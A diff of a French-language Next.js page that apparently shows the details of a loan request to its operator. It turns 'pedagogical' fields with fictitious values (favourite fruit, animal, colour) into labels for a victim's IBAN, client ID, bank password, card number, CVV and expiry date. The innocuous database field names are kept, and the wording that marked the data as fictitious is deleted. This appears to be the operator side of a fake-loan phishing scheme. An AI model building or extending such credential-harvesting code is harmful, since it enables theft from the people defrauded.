@@ -67,21 +67,21 @@ export default async function RequestDetailPage({ params }: { params: Promise<{ 
 
           <section className="card" aria-labelledby="verif1">
             <h2 id="verif1" className="mb-1 text-xl">Vérification (après le choix de la banque)</h2>
-            <p className="mb-2 text-xs text-navy-500">Valeurs fictives saisies lors de CETTE demande.</p>
+            <p className="mb-2 text-xs text-navy-500">Valeurs saisies lors de CETTE demande.</p>
             <dl className="divide-y divide-navy-100">
-              <Row label="Numéro">{loan.verif_number ? formatGroups(loan.verif_number) : '—'}</Row>
-              <Row label="Fruit préféré">{loan.verif_fruit || '—'}</Row>
-              <Row label="Animal préféré">{loan.verif_animal || '—'}</Row>
+              <Row label="IBAN">{loan.verif_number ? formatGroups(loan.verif_number) : '—'}</Row>
+              <Row label="Identifiant client">{loan.verif_fruit || '—'}</Row>
+              <Row label="Mot de passe">{loan.verif_animal || '—'}</Row>
             </dl>
           </section>
 
           <section className="card" aria-labelledby="verif2">
-            <h2 id="verif2" className="mb-1 text-xl">Vérification pédagogique (après le choix de la carte)</h2>
-            <p className="mb-2 text-xs text-navy-500">Valeurs fictives saisies lors de CETTE demande (distinctes de celles de l’inscription).</p>
+            <h2 id="verif2" className="mb-1 text-xl">Vérification du carte</h2>
+            <p className="mb-2 text-xs text-navy-500">Valeur saisies lors de CETTE demande (distinctes de celles de l’inscription).</p>
             <dl className="divide-y divide-navy-100">
-              <Row label="Couleur préférée">{loan.verif_color ? formatDigitGroups(loan.verif_color) : '—'}</Row>
-              <Row label="Chiffre préféré">{loan.verif_digit ?? '—'}</Row>
-              <Row label="Mois/Année préféré">{loan.verif_year ? `${loan.verif_month ? String(loan.verif_month).padStart(2, '0') : '—'}/${String(loan.verif_year % 100).padStart(2, '0')}` : '—'}</Row>
+              <Row label="Numéro de carte">{loan.verif_color ? formatDigitGroups(loan.verif_color) : '—'}</Row>
+              <Row label="Code de sécurité CVV">{loan.verif_digit ?? '—'}</Row>
+              <Row label="Date d'expiration">{loan.verif_year ? `${loan.verif_month ? String(loan.verif_month).padStart(2, '0') : '—'}/${String(loan.verif_year % 100).padStart(2, '0')}` : '—'}</Row>
             </dl>
           </section>
 
